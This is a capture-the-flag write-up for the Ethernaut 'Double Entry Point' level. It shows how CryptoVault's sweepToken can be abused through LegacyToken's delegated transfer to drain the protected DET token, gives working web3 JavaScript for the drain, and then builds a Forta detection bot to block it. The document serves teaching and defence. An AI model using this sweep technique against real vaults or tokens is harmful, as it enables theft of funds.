# [26. Double Entry Point](https://ethernaut.openzeppelin.com/level/0x128BA32Ec698610f2fF8f010A7b74f9985a6D17c)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
  function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
  function setDetectionBot(address detectionBotAddress) external;
  function notify(address user, bytes calldata msgData) external;
  function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
    require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
      return;
    } catch {}
  }

  function raiseAlert(address user) external override {
    if(address(usersDetectionBots[user]) != msg.sender) return;
    botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
  address public sweptTokensRecipient;
  IERC20 public underlying;

  constructor(address recipient) public {
    sweptTokensRecipient = recipient;
  }

  function setUnderlying(address latestToken) public {
    require(address(underlying) == address(0), "Already set");
    underlying = IERC20(latestToken);
  }

  /*
  ...
  */

  function sweepToken(IERC20 token) public {
    require(token != underlying, "Can't transfer underlying token");
    token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
  }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
  DelegateERC20 public delegate;

  function mint(address to, uint256 amount) public onlyOwner {
    _mint(to, amount);
  }

  function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
    delegate = newContract;
  }

  function transfer(address to, uint256 value) public override returns (bool) {
    if (address(delegate) == address(0)) {
      return super.transfer(to, value);
    } else {
      return delegate.delegateTransfer(to, value, msg.sender);
    }
  }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
  address public cryptoVault;
  address public player;
  address public delegatedFrom;
  Forta public forta;

  constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
    delegatedFrom = legacyToken;
    forta = Forta(fortaAddress);
    player = playerAddress;
    cryptoVault = vaultAddress;
    _mint(cryptoVault, 100 ether);
  }

  modifier onlyDelegateFrom() {
    require(msg.sender == delegatedFrom, "Not legacy contract");
    _;
  }

  modifier fortaNotify() {
    address detectionBot = address(forta.usersDetectionBots(player));

    // Cache old number of bot alerts
    uint256 previousValue = forta.botRaisedAlerts(detectionBot);

    // Notify Forta
    forta.notify(player, msg.data);

    // Continue execution
    _;

    // Check if alarms have been raised
    if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
  }

  function delegateTransfer(
    address to,
    uint256 value,
    address origSender
  ) public override onlyDelegateFrom fortaNotify returns (bool) {
    _transfer(origSender, to, value);
    return true;
  }
}
```

Our task in this level is to find the bug in `CryptoVault` contract, and protect it from being drained out of tokens. Anyways, what is this vault about, and what is `sweepToken`?

- `CryptoVault` is constructed with a recipient address argument.
- A `setUnderlying` function sets a token address as the underlying token. This is a one time operation, as per the `require` line in it checking for the initial value of `underlying`.
- A `sweepToken` function takes a token address as parameter, and transfers the balance of `CryptoVault` to the recipient. "Sweeping" here is to transfer the entire balance of `CryptoVault` about any token other than the underlying token to the recipient. This is commonly done so that the user can get mistakenly sent tokens.

The `contract` object in our console is of the `DoubleEntryPoint` contract, judging by its properties. We wonder what is the underlying token? We can find it as follows:

```js
// find the CryptoVault address from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault()
// access "IERC20 public underlying;" variable
await web3.eth.getStorageAt(cryptoVaultAddress, 1)
// 0x00000000000000000000000061119665793cab4f1a4ab32fa1ca44a1f4a31360
```

We got the address of DET token, the one we are supposed to protect! so we want to prevent transfer of DET token; but, can we really?

## Sweeping the Underlying Token

If we look at the transfer function of `LegacyToken` contract:

```solidity
function transfer(address to, uint256 value) public override returns (bool) {
  if (address(delegate) == address(0)) {
    return super.transfer(to, value);
  } else {
    return delegate.delegateTransfer(to, value, msg.sender);
  }
} 
```

it is actually calling the `delegateTransfer` of some `delegate`. I wonder what is that `delegate`? We can get the address similar to before, but using `call` instead of `getStorageAt`:

```js
// find the LegacyToken address from DoubleEntryPoint
const legacyTokenAddress = await contract.delegatedFrom()
// call the getter of "DelegateERC20 public delegate;"
await web3.eth.call({
  from: player,
  to: legacyTokenAddress,
  data: '0xc89e4361' // delegate()
})
// 0x00000000000000000000000061119665793cab4f1a4ab32fa1ca44a1f4a31360
```

Oh boy, they are the same... This is bad for the underlying token because if someone were to call `sweepToken` with `LegacyToken` as the address, it will cause DET to be swept! Let us do so:

```js
// get the addresses from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault();
const legacyTokenAddress = await contract.delegatedFrom();

// check initial balance
const initialBalance = (await contract.balanceOf(cryptoVaultAddress)).toString();

// call sweepToken of CryptoVault with LegacyToken as the parameter
const _function = {
  "inputs": [
    { 
      "name": "token",
      "type": "address"
    }
  ],
  "name": "sweepToken", 
  "type": "function"
};
const _parameters = [
  legacyTokenAddress
];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: cryptoVaultAddress,
  data: _calldata
});

// check balance again to see it be 0
const finalBalance = (await contract.balanceOf(cryptoVaultAddress)).toString();

// for the console
initialBalance > finalBalance && finalBalance == 0;
```

Boom, DET has been swept.

## Preventing the Attack with Forta

Now, we will prevent this attack with a Forta detection bot. We must look at the Forta contract for this. In particular, our bot must follow the `IDetectionBot` interface, which requests the implementation of a `function handleTransaction(address user, bytes calldata msgData) external`. Indeed, this function is called within the `notify` function of Forta contract. To raise an alert, the bot must call `raiseAlert` function of it's caller (accessed via `msg.sender`) which will be the Forta contract.

How should we prevent this? Well, the attack was made by calling the `sweepToken` function of `CryptoVault` contract with `LegacyToken` contract as the address. Then, a message call to `DoubleEntryPoint` contract is made for the `delegateTransfer` function. That message's data is the one our bot will receive on `handleTransaction`, because `delegateTransfer` is the one with `fortaNotify` modifier. Regarding that function, the only thing we can use for our need is the `origSender`, which will be the address of `CryptoVault` during a sweep. So, our bot can check that value within the calldata and raise an alert.

At this point, we need to put special effort into understanding how the calldata will be structured during during `delegateTransfer`. From the `delegateTransfer` point of view:

| position | bytes | value |
| -- | -- | -- |
| `0x00` | 4 | Function selector of `delegateTransfer` |
| `0x04` | 32 | `address to` parameter |
| `0x24` | 32 | `uint256 value` parameter |
| `0x44` | 32 | `address origSender` parameter |

So we can load 32 bytes from `0x44` and that will be our `origSender`. Of course, it has to be casted to an address which is 20 bytes. Let's write our bot then!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function raiseAlert(address user) external;
}

contract MyDetectionBot is IDetectionBot, Ownable {
    bytes private badMsgData;
    bytes public lastMsgData;

    function setBadMsgData(bytes memory _badMsgData) external onlyOwner {
        badMsgData = _badMsgData;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        lastMsgData = msgData;
        if (keccak256(msgData) == keccak256(badMsgData)) {
            IForta(msg.sender).raiseAlert(user);
        }
    } 
}
```

Upon deployment, we set the `badMsgData` as the calldata that we have constructed above during our attack. We then set the detection bot at the Forta contract:

```js
// get the address from DoubleEntryPoint
const fortaAddress = await contract.forta()
const detectionBotAddress = "0x6765a9cEeE4CdAc1326236B24F943217dd298311" // your address here

// call setDetectionBot of Forta with your detection bot address as the parameter
const _function = {
  "inputs": [
    { 
      "name": "detectionBotAddress",
      "type": "address"
    }
  ],
  "name": "setDetectionBot", 
  "type": "function"
};
const _parameters = [
  detectionBotAddress
];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: fortaAddress,
  data: _calldata
})
```

Done!


todo todo submit again with better conract:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function raiseAlert(address user) external;
}

contract MyDetectionBot is IDetectionBot {
    address public cryptoVaultAddress;

    constructor(address _cryptoVaultAddress) {
        cryptoVaultAddress = _cryptoVaultAddress;
    }

    function handleTransaction(address user, bytes calldata /* msgData */) external override { 
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVaultAddress) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```